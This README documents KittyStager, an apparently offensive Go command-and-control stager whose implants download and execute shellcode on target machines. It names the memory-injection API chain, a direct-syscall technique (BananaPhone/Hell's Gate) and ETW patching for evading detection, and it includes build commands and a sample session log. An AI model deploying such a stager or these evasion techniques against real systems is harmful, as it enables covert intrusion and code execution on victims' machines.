# KittyStager


![](/img/chat.png)


KittyStager is a simple stage 0 C2. The purpose of this project is to be able to have some stage 0 templates and be 
able to use the with any shellcode. I would not use this project in red team, at least not now.



## Content
- [How it works](#how-it-works)
- [Quick start](#quick-start)
- [Kitten's](#Kitten)
- [Project structure](#project-structure)


## How it works

1. Configure all the settings in the config file
2. Start the server
    1. The server will start
    2. A config file will be created with each kitten
    3. It will configure the sleep time for the kitten
3. Compile the kitten
4. Run the kitten

![](/img/workfow.svg)

## Quick start
How to compile
```
go build -o kittyStager
./kittyStager

cd /kitten/basickitten
go build -o basickitten
./basickitten
```
How to use :
```
~\go\Project_go\GoStager\cmd\kittyStager main ❯ go run .\main.go
                     _
                    / )
                   ( (
     A.-.A  .-""-.  ) )
    / , , \/      \/ /
   =\  t  ;=    /   /
     `--,'  .""|   /
         || |  \\ \
        ((,_|  ((,_\

KittyStager - A simple stager written in Go

[+] Config loaded
[+] Generated conf file for C:\Users\yanng\go\Project_go\GoStager\kitten\basicKitten
[+] Generated conf file for C:\Users\yanng\go\Project_go\GoStager\kitten\bananaKitten
[+] Config file generated
[+] Starting http server
[+] Sleep set to 5s on all targets
[+] Started http server on 127.0.0.1:8080

KittyStager 🐈❯
[+] Request from: 127.0.0.1
[+] User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0
[+] Hostname: TARGET
[+] Username: target
[+] To get more, use the recon 

KittyStager 🐈❯ interact
[*] Targets:
0 - all targets
1 - 127.0.0.1

[*] Please enter the ip of the target
id: 1

KittyStager - 127.0.0.1 🐈❯ shellcode
[*] Please enter the path to the shellcode
Path: ..\..\shellcode\shellcode.bin
[+] Key generated is : TARGETTARGETTARGETTARGETTARGET
[+] Shellcode hosted for 127.0.0.1 
```

## Kitten
The kitten is the stage 0 payload. It will be compiled and run on the target machine. The kitten will then download the shellcode and execute it.
For the moment, they are only two kittens:
### BasicKitten
This is the basic kitten, and it has the minimum to work. No fancy injection method, just a 
`VirtualAlloc` -> `RtlCopyMemory` -> `VirtualProtect` -> `CreateThread` -> `WaitForSingleObject`. Use this as example if you want to develop your own kitten.
### BananaKitten
This is the more advanced kitten. It will use bananaphone, a variant of hell's gate implemented in Go. [https://github.com/C-Sto/BananaPhone](https://github.com/C-Sto/BananaPhone)
It also patches etw. 

## Project structure
### kitten 
This is the folder where all the kittens are stored. Each kitten has its own folder.
### cmd
#### kittyStager
Main file of the project. It will start the server and create the config file for each kitten.
#### config
Used to read and check the config file. The config file is `conf.yml`
#### http
Used to start the server and serve the shellcode.
#### cli
This is the cli to interact with the server.
#### interact
This is the cli to interact with a kitten, select a shellcode or change sleep time. 
#### util
It contains all the util functions used in the project.
#### cryptoUtil
It contains all the util functions used to encrypt and decrypt the shellcode.
#### httpUtil
It contains all the util functions used to interact with the server.
#### malwareUtil
It contains all the functions used only by the kittens
